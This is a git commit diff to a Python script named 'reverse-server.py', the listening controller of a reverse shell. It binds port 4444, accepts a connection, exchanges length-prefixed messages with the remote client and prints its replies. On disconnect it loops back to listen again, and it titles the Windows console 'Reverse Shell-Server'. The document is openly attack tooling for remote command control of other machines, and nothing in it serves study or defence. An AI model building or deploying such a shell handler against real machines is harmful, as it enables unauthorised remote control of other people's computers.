03d6832db3ce1ba4a56b23aeab833798487aa25c
lucid <42042124+lucidGH@users.noreply.github.com>
2019-07-16 09:29:56 +0200

    Update reverse-server.py

--- reverse-server.py
+++ reverse-server.py
@@ -1,15 +1,18 @@
 import socket
 import struct
+import ctypes
 
 def send_msg(socks, msg):
-    msg = struct.pack(">I", len(msg)) + msg
-    socks.sendall(msg)
+    msg = struct.pack(">I", len(msg)) + msg ##sends packed binary data that containts length of the msg and the msg itself##
+    socks.sendall(msg) ##with format >Integer that packed format is numMsg like 3msg##
+
 def recv_msg(socks):
     raw_msg = recvall(socks, 4)
     if not raw_msg:
         return None
     msglen = struct.unpack(">I", raw_msg)[0]
     return recvall(socks, msglen)
+
 def recvall(sock,n):
     data = b''
     while len(data) < n:
@@ -22,10 +25,10 @@ def recvall(sock,n):
 def listenExec():
     global conn
     global addr
-    print("Server Initialized")
+    print("Shell Script Initialized")
     s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     s.bind(("127.0.0.1", 4444))
-    print("Listening...")
+    print("Listening for connections...\n")
     s.listen(1)
     conn, addr = s.accept()
     print("Connection Established!")
@@ -40,9 +43,16 @@ def listenExec():
             recv = recv_msg(conn)
             print(recv, end="\n")
         except socket.error:
-                conn.close()
+            conn.close()
+            print('Client Closed Trying Again...')
+            listenExec()
         except TypeError:
-            pass
+            conn.close()
+            print('Client Closed Trying Again...')
+            listenExec()
         except AttributeError:
-            pass
+            conn.close()
+            print('Client Closed Trying Again...')
+            listenExec()
+ctypes.windll.kernel32.SetConsoleTitleW("Reverse Shell-Server")
 listenExec()
